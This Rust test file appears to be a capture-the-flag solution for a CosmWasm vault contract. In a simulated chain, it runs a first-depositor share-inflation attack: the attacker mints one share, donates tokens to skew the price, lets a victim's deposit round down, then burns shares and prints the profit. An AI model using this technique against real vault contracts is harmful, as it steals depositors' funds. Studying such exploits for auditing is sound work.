#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::Balance,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint funds to users
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn exploit() {
        // let's break the invariant `total_assets / total_supply = 1`

        let (mut app, contract_addr) = proper_instantiate();

        let attacker_addr = Addr::unchecked(USER);
        let attacker_initial_balance = app
            .wrap()
            .query_balance(attacker_addr.clone(), DENOM)
            .unwrap();
        let victim_addr = Addr::unchecked(USER2);
        let victim_initial_balance = app
            .wrap()
            .query_balance(victim_addr.clone(), DENOM)
            .unwrap();

        app.execute_contract(
            attacker_addr.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1, DENOM)],
        )
        .unwrap();

        app.send_tokens(
            attacker_addr.clone(),
            contract_addr.clone(),
            &[coin(
                (victim_initial_balance.amount / Uint128::new(2)).u128(),
                DENOM,
            )],
        )
        .unwrap();

        app.execute_contract(
            victim_addr,
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10000, DENOM)],
        )
        .unwrap();

        let token_balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: attacker_addr.to_string(),
                },
            )
            .unwrap();

        app.execute_contract(
            attacker_addr.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: token_balance.amount,
            },
            &[],
        )
        .unwrap();

        let balance = app.wrap().query_balance(attacker_addr, DENOM).unwrap();
        let profit = balance.amount - attacker_initial_balance.amount;
        println!("Profit: {}", profit);
    }
}
